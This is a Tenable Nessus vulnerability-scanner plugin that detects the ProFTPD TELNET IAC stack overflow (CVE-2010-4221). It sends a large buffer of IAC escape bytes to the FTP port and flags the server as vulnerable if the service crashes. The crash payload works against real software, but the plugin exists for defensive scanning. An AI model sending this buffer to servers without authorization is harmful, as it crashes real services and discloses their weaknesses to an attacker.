#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70446);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2017/04/25 20:29:05 $");

  script_cve_id("CVE-2010-4221");
  script_bugtraq_id(44562);
  script_osvdb_id(68985);
  script_xref(name:"EDB-ID", value:"15449");

  script_name(english:"ProFTPD TELNET IAC Escape Sequence Remote Buffer Overflow");
  script_summary(english:"Attempts a buffer overflow.");

  script_set_attribute(attribute:"synopsis", value:
"The remote ProFTP daemon is affected by a buffer overflow
vulnerability.");
  script_set_attribute(attribute:"description", value:

"The remote ProFTP daemon is susceptible to an overflow condition.  The
TELNET_IAC escape sequence handling fails to properly sanitize user-
supplied input resulting in a stack overflow.  With a specially crafted
request, an unauthenticated, remote attacker could potentially execute
arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-10-229/");
  script_set_attribute(attribute:"see_also", value:"http://bugs.proftpd.org/show_bug.cgi?id=3521");
  # https://web.archive.org/web/20161014120848/http://www.proftpd.org/docs/NEWS-1.3.3c
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ca7bee7d");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.3.3c or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/10/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/proftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("misc_func.inc");

get_kb_item_or_exit("ftp/proftpd");

port = get_ftp_port(default:21);
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

res = ftp_recv_line(socket:soc);
if (isnull(res)) audit(AUDIT_RESP_NOT, port);

# Attempt to crash service with large buffer of TELNET IACs.
buffer = '\x00' + crap(length:0x8000, data:'\xff\x00') + '\r\n';
send(socket:soc, data:buffer);
send(socket:soc, data:'\n');
res = ftp_recv_line(socket:soc);
ret = socket_get_error(soc);
ftp_close(socket:soc);

if (!isnull(res) || ret != ECONNRESET) audit(AUDIT_LISTEN_NOT_VULN, "ProFTPD", port);

security_hole(port);
